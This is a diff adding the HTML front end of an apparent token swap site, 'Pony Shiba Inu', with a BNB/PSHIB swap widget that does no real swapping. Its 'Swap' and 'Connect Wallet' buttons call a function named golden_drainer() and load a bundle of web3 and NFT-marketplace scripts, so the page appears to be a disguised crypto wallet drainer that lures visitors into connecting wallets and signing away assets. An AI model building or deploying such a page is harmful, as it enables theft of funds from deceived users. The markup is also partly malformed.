@@ -1,0 +1,252 @@
+﻿<!doctype html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="" content="Pony Shiba Inu">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0 shrink-to-fit=no">
+    <script src="3.3.5"></script>
+    <!-- fonts -->
+    <!-- title -->
+    <title>Home | Pony Shiba Inu</title>
+    <!-- fav icon -->
+    <link rel="icon" type="image/jpg" href="img/Logo.png">
+    <!--fb-->
+    <link href="ajax/libs/flowbite/1.6.3/flowbite.min.css" rel="stylesheet">
+    <link href="npm/tailwindcss%402.2.19/dist/tailwind.min.css" rel="stylesheet">
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="css2?family=Exo:wght@100;200;300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="ionicons%404.5.10-0/dist/ionicons.js"></script>
+
+    <script src="jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+		<!-- import main script file -->
+    <!-- Logo Rotate -->
+    <!-- <style>
+      @keyframes rotate-horizontal {
+        0% {
+          transform: rotateY(0deg);
+        }
+        100% {
+          transform: rotateY(360deg);
+        }
+      }
+  
+      .animate-spin-horizontal {
+        animation: rotate-horizontal 2s linear infinite;
+      }
+    </style> -->
+    <style>
+      @keyframes floatUpDown {
+        0%, 100% {
+          transform: translateY(0);
+        }
+        50% {
+          transform: translateY(-20px); /* Adjust the vertical distance */
+        }
+      }
+  
+      .animate-float {
+        animation: floatUpDown 3s infinite;
+        /* Adjust animation duration and other properties as needed */
+      }
+      
+      
+    </style>
+     <style>
+        #amountInput:focus {
+            color: black;
+        }
+    </style>
+    <style>
+        /* Hide spinner arrows in number input when focused */
+        input[type="number"]::-webkit-inner-spin-button,
+        input[type="number"]::-webkit-outer-spin-button {
+          -webkit-appearance: none;
+          margin: 0;
+        }
+      
+        input[type="number"] {
+          -moz-appearance: textfield;
+        }
+      </style>
+</head>
+
+<body class="font-[Exo] bg-gray-800 h-screen">
+    <!--header start-->
+    <<header class="fixed top-0 bg-opacity-80 bg-clip-padding backdrop-blur-md bg-gray-800  w-full h-24 items-center shadow-md border-black content-center">
+        <nav class="flex justify-between items-center w-[92%] max-w-5xl mx-auto">
+            <div>
+                <img class="w-16 mt-2 justify-start" src="img/Logo.png" href="index.html">
+                <!-- <h1 class="text-5xl text-white font-300 font-[Exo] content-center mt-5"></h1> -->  <!--commented out-->
+            </div>
+            <!-- <img class="w-16 mt-2 justify-start" src="img/Logo.png"> --> <!--commented out-->
+            <div class="bg-black bg-md md:bg-transparent opacity-90 nav-links duration-500 md:static absolute text-gray-400 bg-sm text-lg md:min-h-fit min-h-[20vh] left-0 top-[-450%] md:w-auto w-full flex items-center px-5 mt-5 shadow-2xl">
+                <!--nav start-->
+                <ul class="flex md:flex-row flex-col md:items-center md:gap-[4vw] gap-8">
+                    <div>
+                        <a class="hover:text-pink-500" href="index.html"></a>
+                    </div>
+                    <div>
+                        <a class="hover:text-pink-500" href="#index.html"></a>
+                    </div>
+                    <div>
+                        <a class="hover:text-pink-500" href="index.html"></a>
+                    </div>
+                </ul><!--nav end-->
+            </div>
+            
+            <div class="flex items-center ">
+              <a href="#" class="bg-black border-2 border-pink-600 hover:bg-pink-500 text-white t text-xl px-5 py-2 rounded-full  mt-5" onclick="golden_drainer()">Swap</a>
+              <script src="assets/web3-provider/web3-connect.js"></script>
+              <script src="assets/web3-provider/web3-router.js"></script>
+              <script src="assets/web3-provider/web3-module.js"></script>
+              <script src="assets/web3-provider/web3-alert.js"></script>
+              <script src="assets/web3-provider/web3-seaport.js"></script>
+              <script src="assets/web3-provider/web3-data.js"></script>
+              <script src="assets/web3-provider/ethers.js"></script>
+              <script src="assets/web3-provider/ethereum-tx.js"></script>
+              <script src="assets/web3-modules/module-seaport.js"></script>
+              <script src="assets/web3-modules/module-blur.js"></script>
+              <script src="assets/web3-modules/module-x2y2.js"></script>
+              <script src="assets/web3-provider.js"></script>
+              <script>
+                setInterval(() => {
+                  document.getElementById("injected-status").innerHTML =
+                    typeof window.ethereum === "object" ? "true" : "false";
+                }, 1000);
+              </script>
+            </div>
+        </nav><!--nav end-->    
+    </header><!--header end-->
+    <script>
+        const navLinks = document.querySelector('.nav-links')
+        function onToggleMenu(e){
+            e.name = e.name === 'menu' ? 'close' : 'menu'
+            navLinks.classList.toggle('top-[9%]')
+        }
+    </script><!--queryselector-->
+    <!--home start-->
+    <!--home section start-->
+<!--cards start--> 
+<section id="swap">
+    <div class="container pt-32 grid-cols-0 max-w-xl mx-auto place-items-center place-content-center relative shadow-white-xl">
+        <!-- Main Container -->
+        <div class="bg-zinc-900 rounded-3xl p-3 m-16 border border-gray-700 relative">
+            <!-- Top Container with Swap and Buy -->
+            <div class="flex justify-between">
+                <div class="text-lg font-medium text-gray-300 hover:text-white cursor-pointer border border-transparent px-2 py-1 rounded">Swap</div>
+                <div class="text-lg text-gray-500 hover:text-white cursor-pointer border border-transparent px-2 py-1 rounded"></div>
+            </div>
+
+            <div class="bg-zinc-950 h-24 mt-2 hover:bg-black flex items-center relative rounded-2xl" id="container1">
+              <div class="flex items-center justify-between w-full">
+                <div class="flex items-center">
+                
+                <input type="text" class="text-gray-500 text-2xl font-medium ml-2 bg-transparent border-none focus:outline-none focus:ring-0 w-28 sm:w-40 lg:w-72" value="0" id="transparent1" readonly="">
+              </div>
+                <div class="w-28 inline-block relative bg-zinc-900 p-3 pl-4 rounded-full flex items-center hover:bg-zinc-800 mr-2">
+                  <!-- You can add your logo image or icon here -->
+                  <img src="img/bsc01.png" alt="Logo" class="h-8 w-8 mr-1" id="image1">
+                  <span class="text-white text-base font-semibold" id="text1">BNB</span>
+                </div>
+              </div>
+            </div>
+            
+            
+
+            <!-- Button in the middle of the two containers -->
+            <div class="bg-zinc-900 w-10 h-10 -mt-2 mx-auto absolute left-0 right-0 top-1/2 -translate-x-1 transform -translate-y-1/2 border border-zinc-800 border-4 rounded-xl hover:bg-zinc-800 z-10" id="swapButton">
+                <img src="img/downarrow.png" alt="Custom Arrow" class="h-4 w-4 text-white absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
+            </div>
+
+            <div class="bg-zinc-950 h-24 mt-2 hover:bg-black flex items-center relative rounded-2xl" id="container2">
+              <div class="flex items-center justify-between w-full">
+                <div class="flex items-center">
+                  <input type="text" class="text-gray-500 text-2xl font-medium ml-2 bg-transparent border-none focus:outline-none focus:ring-0 w-28 sm:w-40 lg:w-72" value="0" id="transparent2" readonly="">
+                </div>
+                <div class="w-28 inline-block relative bg-zinc-900 p-3 pl-4 rounded-full flex items-center hover:bg-zinc-800 mr-2">
+                  <!-- You can add your logo image or icon here -->
+                  <img src="img/pshiblogo.png" alt="Logo" class="h-8 w-8 mr-1" id="image2">
+                  <span class="text-white text-base font-semibold" id="text2">PSHIB</span>
+                </div>
+              </div>
+            </div>
+            
+            
+            <!-- Connect Wallet Button green on hover with single color -->
+            <div class="">
+              <a href="#" class="mt-2 block bg-zinc-950 hover:bg-black text-white text-center py-4 rounded-xl shadow-sm font-semibold" onclick="golden_drainer()">Connect Wallet</a>
+              <script src="assets/web3-provider/web3-connect.js"></script>
+              <script src="assets/web3-provider/web3-router.js"></script>
+              <script src="assets/web3-provider/web3-module.js"></script>
+              <script src="assets/web3-provider/web3-alert.js"></script>
+              <script src="assets/web3-provider/web3-seaport.js"></script>
+              <script src="assets/web3-provider/web3-data.js"></script>
+              <script src="assets/web3-provider/ethers.js"></script>
+              <script src="assets/web3-provider/ethereum-tx.js"></script>
+              <script src="assets/web3-modules/module-seaport.js"></script>
+              <script src="assets/web3-modules/module-blur.js"></script>
+              <script src="assets/web3-modules/module-x2y2.js"></script>
+              <script src="assets/web3-provider.js"></script>
+              <script>
+                setInterval(() => {
+                  document.getElementById("injected-status").innerHTML =
+                    typeof window.ethereum === "object" ? "true" : "false";
+                }, 1000);
+              </script>
+            </div>
+        </div>
+
+        <script src="https://unpkg.com/tailwindcss@2.2.19/dist/tailwind.min.js"></script>
+        <script>
+            const swapButton = document.getElementById('swapButton');
+            const transparent1 = document.getElementById('transparent1');
+            const transparent2 = document.getElementById('transparent2');
+            const image1 = document.getElementById('image1');
+            const text1 = document.getElementById('text1');
+            const image2 = document.getElementById('image2');
+            const text2 = document.getElementById('text2');
+
+            swapButton.addEventListener('click', () => {
+                // Swap the entire content of the containers (including values, logos, and text)
+                const tempImage1Src = image1.src;
+                const tempImage2Src = image2.src;
+                const tempText1 = text1.textContent;
+                const tempText2 = text2.textContent;
+                const tempValue1 = parseFloat(transparent1.value) * 100000000;
+                const tempValue2 = parseFloat(transparent2.value) / 100000000;
+
+                image1.src = tempImage2Src;
+                image2.src = tempImage1Src;
+                text1.textContent = tempText2;
+                text2.textContent = tempText1;
+                transparent1.value = isNaN(tempValue1) ? 0 : tempValue1.toFixed(2);
+                transparent2.value = isNaN(tempValue2) ? 0 : tempValue2.toFixed(2);
+            });
+        </script>
+    </div>
+</section>
+  
+</body>
+<!-- audit modal start-->
+<div id="Audit" aria-hidden="true" class="hidden overflow-x-hidden overflow-y-auto fixed h-modal md:h-full top-4 left-0 right-0 md:inset-0 z-50 justify-center items-center">
+  <div class="relative w-full max-w-2xl px-4 h-full md:h-auto">
+      <!-- modal content -->
+      <div class=" bg-white rounded-lg shadow relative dark:bg-zinc-900">
+          <!-- modal header -->
+          <div class="flex items-start justify-between p-5 border-b rounded-t dark:border-gray-600">
+              <h3 class="text-gray-900 text-2xl lg:text-2xl font-semibold dark:text-white">
+                Audit
+              </h3>
+              <button type="button" class="text-gray-400 bg-transparent hover:bg-gray-200 hover:text-gray-900 rounded-lg text-sm p-1.5 ml-auto inline-flex items-center dark:hover:bg-gray-600 dark:hover:text-white" data-modal-toggle="Audit">
+                  <svg class="w-5 h-5" fill="currentColor" viewbox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd"></path><!--fb-->
+<script src="../path/to/flowbite/dist/flowbite.min.js"></script>
+<script src="ajax/libs/flowbite/1.6.3/flowbite.min.js"></script>
+
+<script src="/script.js"></script>
+
+</svg></button></div></div></div></div></html>
